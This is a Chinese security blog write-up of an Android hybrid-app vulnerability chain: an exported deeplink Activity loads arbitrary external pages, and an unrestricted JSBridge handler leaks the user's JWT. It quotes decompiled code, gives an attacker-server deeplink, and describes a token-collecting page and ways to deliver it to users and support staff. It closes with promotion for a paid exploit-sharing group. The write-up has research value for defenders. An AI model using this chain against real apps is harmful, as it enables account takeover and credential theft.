#  App 漏洞挖掘实战、外部恶意网页可直接调用原生接口窃取用户认证 Token 造成账号接管漏洞  
用户QTItbAcDut
                    用户QTItbAcDut  渗透安全HackTwo   2026-09-28 00:07  
  
**0x01 简介**  
  
混合 App 暗藏高危长链漏洞！在授权安全测试中，通过反编译审计发现目标 App 导出代理 Activity 存在 Deeplink 参数校验缺陷，可绕过路由拦截加载外部恶意 H5 页面。其 JSBridge 敏感能力全局注册，完全不校验网页来源，恶意页面能够直接调用原生接口读取本地持久 JWT 凭证。  
如今主流类App几乎无一例外采用原生+H5的混合开发架构，原生壳负责性能与推送，业务页面大量使用WebView技术来显示与承载。  
攻击者拿到 Token 即可冒充受害者执行业务操作，完成会话级账号接管。  
  
  
  
  
  
  
  
  
> 本文内容仅用于网络安全技术学习与交流，所有操作均在授权测试环境下完成。严禁将文中技术用于未授权检测与非法攻击，违者责任自负。  
  
  
现在只对常读和星标的公众号才展示大图推送，建议大家把**渗透安全HackTwo“设为星标”，否则可能就看不到了啦！**  
  
参考文章  
：  
```
https://xz.aliyun.com/news/92826
https://www.hacktwohub.com/
```  
  
**末尾可领取挖洞资料/加圈子 #渗透安全HackTwo**  
  
**0x02 正文详情**  
  
> 如今就算代码功底一般，也可以借助 JADX 搭配 MCP 插件辅助完成代码审计分析。目标为混合架构 Android App。该应用存在 Deeplink 路由与 WebView JSBridge 组合漏洞，导出的代理 Activity 无严格参数校验，可加载外部恶意 H5 页面。  
  
  
jadx-mcp-server  
```
链接：https://pan.quark.cn/s/1afc9de1149e
```  
  
App安装与查壳  
  
首先下载app，注册账号登录并访问。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibrevicNauKAWMNwoTXJA66r3MiatctMYibDtJMnF1FCYla7rkw9UDVu8TRLoucrruhc37Q5cWZP4JWZtTprleianMFHUSC7iaTynyibjSWfpBe9Fs/640?wx_fmt=png&from=appmsg "")  
  
登录app后可查看该app私有数据目录，可以发现FlutterSharedPreferences.xml文件存储用户的凭证信息，还有手机号，账号个人数据信息等，这里数据太多，只放了JWTtoken的截图信息。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibrevicNauKAWJncJzokEFhKFH6icCgzJoTYqCibejtStyDiaJlXm5TPYrGkH4QSfDxiaibN0mvBRgXxhZribFahK4THgALr8uyAoyXGkrm8t0GicCLA/640?wx_fmt=png&from=appmsg "")  
  
既然存在token信息，这里其实可以去第一步想到的就是去分析下apk文件，看看有没有文件备份类漏洞，或者开启了debug调试类漏洞等等。  
  
提取 APK命令如下：  
```
adb shell pm path com.cdxxxxx.chxxxx
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibrevicNauKAVuwcFUlibT3JINFOyjeplGJVibnKdBYg1P0Zyz3LOPdia9fRrl9GsRZQUFxehUrwQIL7mYQt8qk2OBia4L8tKibew3gibialcwHqwvmU/640?wx_fmt=png&from=appmsg "")  
```
adb pull <pm path输出的apk路径> ./base.apk
```  
  
首先apk查壳，可以发现没有进行加固处理  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibrevicNauKAUE8Czvw3baqczVOHpN3YrdJRaPp9CKZGNlwp69LLw4XAh8Aa5fjSPfThf3l0umMc12JjroJRw26iafb0b5Q27mXLzEyvh8ZuBE/640?wx_fmt=png&from=appmsg "")  
  
AndroidManifest分析  
  
使用jadx反编译apk，注意这里如果遇到关键反编译代码文件无法反编译成功因为jadx-GUI默认开启的是“严格模式”，遇到反编译失败可以菜单 File → Preferences->Decompilation（反编译）选项卡->勾选Show inconsistent code点击save即可  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibrevicNauKAWzlaKlfna4hP28aJw4wib3kbqftePJ4d1ibNWuwCSGJXjHqXC6UsuicwnIQdvGHHTSpyibiap7fXaYTqvtA1qZPzdp4TDc9E6YPPmc/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibrevicNauKAVmmicwtAaVqXiayh24UbWLmIich12wrW4HroF3POIIxPOhxNsI7nthas0fgugqmBTv3cia87Ut7dQd9fpPZA82SNibibvtOhzjWT7VA/640?wx_fmt=png&from=appmsg "")  
  
第一步查看AndroidManifest.xml文件，通过查壳发现  
  
android:allowBackup="false"，说明该apk不允许导出，但是很多组件是设置的允许导出，但是组件不是这篇文章的重点，而且该组件导出的页面也不是修改密码，修改个人信息等敏感页面，所以相对危害性较低。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibrevicNauKAVCHtowBRq0xV5nVEcMOzhC6mbFzZD0VR3ibcvuSR8hAl6FUOsEqyot84DcY1XUEgrtk5OlLiaqEgibPdXRkvozBg72H77ibFzgvQQ/640?wx_fmt=png&from=appmsg "")  
  
再查询debuggable是否存在，如果不存在说明默认关闭调试功能，与allowBackup字段刚好相反，如果AndroidManifest.xml文件中没有声明allowBackup则说明允许导出备份文件。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibrevicNauKAVv08Vrg4x7HNoIDXdEzG6d5DelTnOUtx2VV7OjftreAldzxyEEPyLExqUiacMBlpKtRejXZvRkPMTYNwmRUU9IFlWwIv7JMrkk/640?wx_fmt=png&from=appmsg "")  
  
不过在这其中发现明文传输配置启用  
```
<applicationandroid:usesCleartextTraffic="true" ...>
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibrevicNauKAX3vQJq17BS2CeBBybQxwl4jWy7uMIqpfVB1tEVIjkywcVKibbbiap0gqC3alKqIshEOXm2xC2ejwFLJoNpGQ9YXOz0aibYlKYAA0/640?wx_fmt=png&from=appmsg "")  
  
同时导出组件里有一组scheme入口，其中最引人注意的是如下配置:  
```
<activity android:name="com.xxxx.android.lib_architecture.splash.ProxyActivity" android:exported="true">
    <data android:scheme="sjqxxx" android:host="hmas.app"/>
</activity>
```  
  
一个exported的代理Activity+自定义scheme，这通常就是外部网页/短信/二维码可触发的路由入口  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibrevicNauKAUBEjyiaZAnTbFiam6x3j6J91ibNiaehkX36bLnMRZZOIx9IYPTiaUYL4T1lrknC6Q1XaTw5xQtDFnAtyKpcXiaLlp9DaSKcUWkUTNFk/640?wx_fmt=png&from=appmsg "")  
  
WebView与JSBridge静态分析  
  
首先通过上述AndroidManifest文件分析，可以发现存在scheme的组件包是com.xxxx.android，在这包中我们发现WebActivity容器，这个com.xxxx.android.comp_webview.WebActivity是一个H5容器  
```
@Route(path = "/web/Default")
......
public final class WebActivity extends BaseMvvmActivity {
......
    @Autowired public String url;   // ARouter 注入，来源完全由调用方决定
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibrevicNauKAVhA9DBU25278N41hAtF8MTfMTnWy6WOY3siac4p7ibibOI3lCnWRS5vNCLv4GUFxNqekWgX0ibdxj4Dib0jpgicxm6A9mfvyjG6WyX4/640?wx_fmt=png&from=appmsg "")  
  
其中存在C0函数，这段函数用于过滤URL中APP自定义的内部交互参数，避免这些内部参数被带到外部链接、或泄露到第三方服务器，保证外部链接加载的纯净性。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibrevicNauKAW74Bxk1UWhyjRDiaSEvBAZDiaQbQlXGRU9Lp86HluImbDv7p9ic7vcczkTbcmicDdhDCqbqMRd8BMgaY1XtfAHBLoJrpDZLZRiadSk/640?wx_fmt=png&from=appmsg "")  
  
第901行，Operators.CONDITION_IF为自定义常量“?”，以?拆分传入的路径  
```
List listV0 = t.v0(oriUrl, new char[]{Operators.CONDITION_IF}, false, 2, 2, null);
if (listV0.size() == 1) {
    return oriUrl;
}
```  
  
然后遍历所有查询参数，过滤内部参数  
```
ArrayList arrayList = new ArrayList();
for (String str : t.v0((CharSequence) listV0.get(1), new char[]{'&'}, false, 0, 6, null)) {
    // 每个参数按=分割，取出参数名（key）
    String str2 = (String) t.v0(str, new char[]{IOUtils.pad}, false, 2, 2, null).get(0);
    // 判断参数名是否是预定义的内部参数
    switch (str2.hashCode()) {
        case -2094054512:
            if (str2.equals("hgWebShareBrief")) { z10 = false; break; }
            else { z10 = true; break; }
        // 其他case逻辑一致...
    }
    // 非内部参数加入保留列表
    if (z10) {
        // 打印被过滤掉的内部参数（调试用）
        fc.a.f15118a.c("WebActivity", str);
        arrayList.add(str);
    }
}
```  
  
最后拼接处理好的参数  
```
// 把保留的参数用&拼接成新的查询字符串
String strX = z.X(arrayList, ContainerUtils.FIELD_DELIMITER, null, null, 0, null, null, 62, null);
if (!(strX.length() > 0)) { strX = null; }
// 把URL路径和新的查询参数拼接，返回最终结果
String str3 = strX != null ? ((String) listV0.get(0)) + Operators.CONDITION_IF + strX : null;
return str3 == null ? (String) listV0.get(0) : str3;
```  
  
C0这段函数是没有任何域名校验的，直接return  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibrevicNauKAWnqPABDc2b9lTMxMCCQWNVIZYPWRv0EGtOPSr4Jc2CcQkMuXm17G6lpAMj7Eia13CMibgvX6ugibyJPokqGuuKo1nmQqVw1hV3PA/640?wx_fmt=png&from=appmsg "")  
  
综上初步简单分析，/web/Default  
 路由可以加载任意外部 URL地址的。  
  
再看它的WebActivity类中的shouldOverrideUrlLoading公共方法  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibrevicNauKAUWU2FecicQUFhTkumNQdbLCZPowtRvGLBkGIVDVncX5d7DrIwd9WlUFMpbQYSwC8Gq8uBdYWib4dm40ByB6w9yicLEKNTDuVoAHQ/640?wx_fmt=png&from=appmsg "")  
  
主要看532行代码、539行代码，检测用户提交的协议，如果是yy://桥协议，那么就交给父类处理。  
  
如果不是HTTP_PROTOCOL、HTTP_PROTOCOL协议就一律全部拦截，反之则走到return Boolean.valueOf(z10);直接放行。其中HTTP_PROTOCOL、HTTP_PROTOCOL都是自定以的常量，分别为http://、https://  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibrevicNauKAW1zt2DRNQ31Q0CymBtmF2KsqFKe2tycVMe8wBId2ywDzUYBicPLUucG3t8yyic4AlKHNibLQ45hqJbEYgAmNQJT3ialXJokNWic72U/640?wx_fmt=png&from=appmsg "")  
```
if (s.G(str, "yy://", false, 2, null)) {
                return super.shouldOverrideUrlLoading(view, p12);
           ......
                if (!s.G(str, DeviceInfo.HTTP_PROTOCOL, false, 2, null) && !s.G(str, DeviceInfo.HTTPS_PROTOCOL, false, 2, null)) {
                    z10 = true;
                }
                return Boolean.valueOf(z10);
            }
```  
  
WebView的实现类是 com.android.xxxx.webview_java.jsbridge.BridgeWebView  
，该类中做了一定的安全检测，其中318行代码关闭了密码自动保存，防止WebView存储的网站密码被恶意读取，并且关闭了file域的跨域读  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibrevicNauKAUficgHXLN4nx6v11Stav3hDDpJ2pWFuSET3exrTydvSbK9gcnwoicMEJ9MXOqlXNEQvtGmdjjjbicoA9MMbDSbUibnnaqRHzT4J1g/640?wx_fmt=png&from=appmsg "")  
  
真正的问题在注入时机，BridgeWebView.this.f6265b为WebViewJavascriptBridge.js文件，该文件存储在assest目录下  
```
public void onPageFinished(WebView webView, String str) throws Throwable {
            super.onPageFinished(webView, str);
            BridgeWebView bridgeWebView = BridgeWebView.this;
            if (bridgeWebView.f6265b != null) {
                i5.b.e(bridgeWebView.f6273j, webView, BridgeWebView.this.f6265b);
            }
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibrevicNauKAWOqNzCmOEZia4xqF6gu7dNKibdp5aISqD2S6PqTTfIV1BDZItia6WQsFCiatCDAMBDZLMSe4dYV12ick9EIfg80WiaCsLNZ2P6kyryQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibrevicNauKAXUIqFqzOck10gnTqicNbzch69HqmFebSibZ50S7Xlpnv5Y0Nbab88xKXkT1YF2jD9USW5IIgsUkQnD4dDia1R8icRpvsvmwanj7Xo/640?wx_fmt=png&from=appmsg "")  
  
其中377行代码i5.b.e()函数把WebViewJavascriptBridge.js文件全部进行加载  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibrevicNauKAWMGokcbiatYaJrWFh2ELecf5QFouH2o5PQLY01s2dWzRpoZwic3gFrCatBhTwfYBslaBMFUfk5zQxBAf0thk5FOibjicPPlHKfGuk/640?wx_fmt=png&from=appmsg "")  
  
JSBridge 通信协议拆解  
  
assets里的WebViewJavascriptBridge.js  
 是URL Scheme桥，分析一下具体运行逻辑  
  
JS 想调原生能力时，构造一个message对象；如果还需要回包（responseCallback），就生成一个唯一callbackId  
 并登记到responseCallbacks  
 字典里——相当于"留个回执地址"message 推进sendMessageQueue队列，然后设置一个隐藏iframe的src= 'yy://QUEUE_MESSAGE'设置iframe的URL会触发 WebView 的shouldOverrideUrlLoading  
 (shouldOverrideUrlLoading方法前面有讲，当检测用户提交的协议，如果是yy://桥协议，那么就交给父类处理)回调，Native 端拦截到 yy://  
 开头的scheme，就知道"队列里有消息了"  
```
function _doSend(message, responseCallback) {
    if (responseCallback) {
        var callbackId = 'cb_' + (uniqueId++) + '_' + new Date().getTime();
        responseCallbacks[callbackId] = responseCallback;
        message.callbackId = callbackId;
    }
    sendMessageQueue.push(message);
    messagingIframe.src = 'yy://__QUEUE_MESSAGE__';         
}
```  
  
Native截获yy://QUEUE_MESSAGE后，调用p()，通过 loadUrl("javascript:..._fetchQueue()") 让JS把队列内容吐出来  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibrevicNauKAXV523pxLtTODolRW5oib6MCIaR6tiac7XDXYdkNmYMn31EYmS86e0xJfsckBlic7icISnjfKVvp7Q5EickwymY3ialJrbQquG297Q4Q/640?wx_fmt=png&from=appmsg "")  
  
q()截获yy://return/_fetchQueue/... 后，从URL里取出key"_fetchQueue"，先去Map里查有没有对应登记的回调，有继续取 JSON、调 bVar.a()  
 分发——查handler注册表、执行原生逻辑、回包给JS。  
```
public final void q(String str) {
    String strC = i5.b.c(str);              // 取 "_fetchQueue"
    g5.b bVar = this.f6266c.get(strC);      // 必须先有 p() 登记的回调才能继续
    String strB = i5.b.b(str);              // 取队列 JSON
    if (bVar != null) {
        bVar.a(strB);                       // 进入 dispatch：查 handler 注册表、执行、回包
        this.f6266c.remove(strC);
    }
}
```  
  
整段代码分析重点为App启动时HogeWebViewInitializer.create()函数把40多个敏感handler（getUserInfo、getRequestHeader、......）一次性塞进全局 Map（h5.c.b().a()函数里面）  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibrevicNauKAWBFLTLqHoMtMtsibz8hMLx1yRiaMkfYWCG07Of1pyaMnRjBclVMcvwPp1tvsMXUc1YuHWe0p4ic6mEeefs3EpjXnyXvSeyhjZsjo/640?wx_fmt=png&from=appmsg "")  
  
而WebView收到消息后分发时按message里的handlerName  
去全局Map查 → 查到就执行 → 完全不关心当前WebView里加载的是哪个网页、哪个域名。如下图，183-184行：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibrevicNauKAULBneLtQUn6RzPA3H87Th9UKzBPPGZSf6W92aW1Fk11FO3ZIj3WeCvwN3YPxf9FGUTr1WshWxkXibDyicrjxsQvQIRxKpnl45NY/640?wx_fmt=png&from=appmsg "")  
  
顺着前面HogeWebViewInitializer.create()函数中的敏感handler  
  
顺着getUserInfo  
找到公共方法类wb.a0  
，调用t0函数获取FlutterSharedPreferences.xml文件信息，然后取出文件中取出Member-User-Authorization、userTokenKey认证信息  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibrevicNauKAVfYFibS4ZcBX2ibVLbzK8RHN9iaTNGAdMQVXzxicS8C4ELbZflG5iaiczjE6HAJnBiaaK4Q3faicVaEoTtaDfCGsXOF4ZfqKFHIczLChQ/640?wx_fmt=png&from=appmsg "")  
  
上图中2848行调用的gd.a.f15853a正式如下图的，其中FlutterSharedPreferences正是开头的FlutterSharedPreferences.xml文件  
```
return BaseApplication.INSTANCE.a().getSharedPreferences("FlutterSharedPreferences", 0);
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibrevicNauKAXG0gH5pncwMfvticDVGtVgSpO1ckBB2kx6evM3uIgNgicaC06EwhN60yqVk6cUH9r5YgqmSQaxcKNicyiaxWla96d3D1icgdvVAOGo/640?wx_fmt=png&from=appmsg "")  
  
通过上述分析，静态链闭环：任意页面 → callHandler('getUserInfo') → 全局注册表 → s0() → Token进响应回调。  
  
Deeplink 路由链分析  
  
com.hoge.android.lib_architecture.splash.ProxyActivity  
 是exported的scheme入口，其参数处理逻辑  
  
攻击者构造链接sjqxx://hmas.app/xxx?link=，截取link=后面传入的URL，URL  
参数没有任何格式校验，URLDecoder后原样进入路由系统。  
```
public final void s0(Intent intent) throws UnsupportedEncodingException {
        if (intent == null) {
            return;
        }
        String dataString = intent.getDataString();
        fc.a.f15118a.f(this.TAG, l.m("jerry scheme data : ", dataString));
        if (dataString != null) {
            List listW0 = t.w0(dataString, new String[]{"link="}, false, 0, 6, null);
            if (listW0.size() > 1) {
                this.schemeUrl = (String) listW0.get(1);
            }
        }
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibrevicNauKAUK93Wbpxk5bXCXIt7CTR2oqmybicLagaP8E8IKLHYIg14MsHgwdvOva4rsVC9I1bZblRO3Tc4BRI1ibZTxoALcKKbdibdZJnrg9M/640?wx_fmt=png&from=appmsg "")  
  
路由会经过拦截器链，这里踩了本次分析的第一个坑。最初我构造的link值是内部路由格式hmas://web/Default?url=...  
，deeplink 发出后ProxyActivity确实拉起了但WebActivity始终没动静。追进拦截器才发现原因——nb.a  
（DefaultRouteInterceptor）开头就是hmas://外部直达被拒  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibrevicNauKAUxU5n8S4mt9wYLg95ab1vHGcYfMfuCkuVwqtMzIC0OfzDNR0vd9KyYMy21dMWVicVU1UIpHKyGNCBEWSaDXibFeHDOvhiccOdKPI/640?wx_fmt=png&from=appmsg "")  
  
当不是hmas://时，使用http/https 时是另一个拦截器 nb.g  
进行处理，以http://或 https://开头的URL直接走分支流程进行跳转，没有任何白名单黑名单限制，d()只处理带专用链接，普通URL直接false，也就是说，把link的值直接写成http/https明文URL，就能一路穿过 ProxyActivity → 拦截器 → /web/Default  
 → WebActivity。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibrevicNauKAW0iaxIw2cYnASPabsWKPFXeaUF8mTAanO0NGGIcknhhZhCI4V8P5svX6QGxZgY7EaMSNAHiaL5OsKpiaWIYHzL6yoQU6A3n1l4Ew/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibrevicNauKAWMqk0aAPk7PbPGomCbTlkDuIgFJBUHysBwpiajB79OEFIaFZaiaFe7SeMACL4Qibwwib6H4EJTlTich9eSnRujuEVtAWJCANZe90Y0/640?wx_fmt=png&from=appmsg "")  
  
最终 deeplink 形态sjqx x://hmas.app/message?link=http%3A%2F%2F<攻击服务器>%2Fpoc.html  
  
一些代码踩坑绕过  
  
桥明明在，回调却永远不来  
  
WebActivity成功加载了攻击页，页面日志打出bridge already there  
——桥对象存在，callAll()  
已执行，无任何JS异常。但收集服务器上只有页面请求，没有任何/collect  
回传  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibrevicNauKAWs4mTCshQicokyEXCsxqE8ibfztZug7gtxsvBMfvnPjQGV61ovkH3raEprhJzIxE2wcB93wEnauStwcY2MLbs7UicD9icsTJ8Yc3Y/640?wx_fmt=png&from=appmsg "")  
  
不调用init()，回包被永久吞掉  
  
重读桥JS，发现_handleMessageFromNative  
的receiveMessageQueue初始为 []，恒为真，只有_dispatchMessageFromNative这里才会触发回调  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibrevicNauKAUrLDXI2JOmqWya5tMrcI5p8wbwPapeQ7SEOVAJNmwbs7yPTNqx49PQWicoV7c4Z5SSwR8oxlYqLtvYyjGOC5K3t39IehgzPcWM/640?wx_fmt=png&from=appmsg "")  
  
漏洞复现  
  
根据上述，分析撰写一个html恶意获取token脚本，运行在云服务器上。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibrevicNauKAV2tnzDkGowbf6P78fiaibcTQW50M1UibJzwOMJKennhpLlCpoNV8sichwNqc8NqZPiar70MrerRo7YhPwfT4bib63zsDuoHvyeMRVhA/640?wx_fmt=png&from=appmsg "")  
  
这里如果是为了本地确认漏洞可以直接使用adb调用链接，如果真实攻击可以直接发链接以app发给用户或者是生成链接，用户使用app二维码扫码。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibrevicNauKAUiaWJlpIibFq0e4ibZ5BPHLZ6IeVLxDbuic9tcWflLuGBAUE6ZQib1qj2PqkgW8ekN9q9QzZMvYcricXtO25tgRIPErTWITcA9Zia1ibs/640?wx_fmt=png&from=appmsg "")  
  
  
而且聊天框还存在html渲染，xss倒是有一定过滤，但是链接是能够渲染的，可直接发送恶意链接获取客服的token信息。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibrevicNauKAVt3aZs0k08Vm3OsnZk6rBJiagBp8XRmnpPx17hNYxW63bL89vTa5U1BCqvAiaCgWGsHQ4VEYoj31V4ZG8LxhbzDtIr4LMiaNKANs/640?wx_fmt=png&from=appmsg "")  
  
如下图，这里使用个人测试账号进行测试，直接加载服务器上运行的脚本，回显token信息  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibrevicNauKAWEVw8CtuPA4EAQoNticPZrtb6d00363icYmiaRWZ3Mq9BYRdavlGrTiayptI2yNk7ojHvaWHkmO9qcDfrHFHogD1Jk2djk9QYG4og/640?wx_fmt=png&from=appmsg "")  
  
log日志文件也成功接收到用户的token信息  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibrevicNauKAUen8n9IxGfosWjgiba0ibMvwkUsIng1GOfAkJ7CbqwsYibTahrsibEpLwzP4jwTErxicHOEEVbFtnY2oiakpdr6QWicQuZT5a6iaSdcdI/640?wx_fmt=png&from=appmsg "")  
  
  
## 0x03 总结这次挖洞算是踩坑踩出经验了，本以为找到入口就能一气呵成复现，结果卡在 JSBridge 回调问题折腾许久。别看这条利用链看着复杂，代码基础一般的师傅借助 JADX+MCP 插件，也能顺藤摸瓜完成审计。简单来说就是 Deeplink 开门，恶意 H5 搭桥，JSBridge 没做来源校验，直接交出用户登录凭证。拿到 Token 就能接管会话，混合 App 的 H5 与原生通信这块，稍不留神就容易埋下这种高危大坑！🔥喜欢这类文章或挖掘SRC技巧文章师傅可以点赞转发支持一下谢谢！内部星球VIP介绍V1.5（更多未公开挖洞技术欢迎加入星球）如果你想学习更多另类渗透SRC/AI挖洞技术/攻防/免杀/应急溯源/赏金赚取/工作内推，欢迎加入我们内部星球可获得内部工具字典和享受内部资源/内部群🔥🚀1.每周更新1day/0day漏洞刷分上分，目前已更新至13794+;🧰2.包含网上的各种付费工具/各种Burp漏洞检测插件/fuzz字典/SRC挖洞SKILL等等;3.Fofa/Hunter/Ctfshow/360Quake/Shadon/零零信安/Zoomeye各种账号VIP会员共享等等;🎥5.最新SRC挖洞文库/红队/代审/免杀/逆向视频资源等等;🧪6.内部自动化漏扫赚赏金捡洞工具，免杀CS/Webshell工具等等;💡7.漏洞报告文库、共享SRC漏洞报告学习挖洞技巧；🎯6.最新0Day1Day漏洞POC/EXP分享地址（同步更新）;https://t.zsxq.com/jVcxV(全网最新最完整的漏洞库)🔥7.详情直接点击下方链接进入了解，后台回复" 星球 "获取优惠先到先得！后续资源会更丰富在加入还是低价！（即将涨价）以上仅介绍部分内容还没完！点击下方地址全面了解👇🏻👉点击了解加入-->>2026内部VIP星球福利介绍V1.5版本-1day/0day漏洞库及内部资源更新结尾免责声明获取方法回复“app" 获取  app渗透和app抓包教程回复“渗透字典" 获取 一些字典已重新划分处理（需要内部专属fuzz字典可加入星球获取，内部字典多年积累整理好用！持续整理中！）回复“书籍" 获取 网络安全相关经典书籍电子版pdf最后必看    文章中的案例或工具仅面向合法授权的企业安全建设行为，如您需要测试内容的可用性，请自行搭建靶机环境，勿用于非法行为。如用于其他用途，由使用者承担全部法律及连带责任，与作者和本公众号无关。本项目所有收录的poc均为漏洞的理论判断，不存在漏洞利用过程，不会对目标发起真实攻击和漏洞利用。文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用。如您在使用本工具或阅读文章的过程中存在任何非法行为，您需自行承担相应后果，我们将不承担任何法律及连带责任。本工具或文章或来源于网络，若有侵权请联系作者删除，请在24小时内删除，请勿用于商业行为，自行查验是否具有后门，切勿相信软件内的广告！往期推荐1.内部VIP知识星球福利介绍V1.5版本0day推送2.最新Nessus2026.2.9版本下载3.最新BurpSuite2026.1.1专业版下载4.最新xray1.9.11高级版下载Windows/Linux5.最新HCL AppScan_Standard_10.9.1下载渗透安全HackTwo微信号：关注公众号获取后台回复星球加入：知识星球扫码关注 了解更多上一篇文章：Nacos配置文件攻防思路总结|揭秘Nacos被低估的攻击面喜欢的师傅可以点赞转发支持一下  
  
  
  
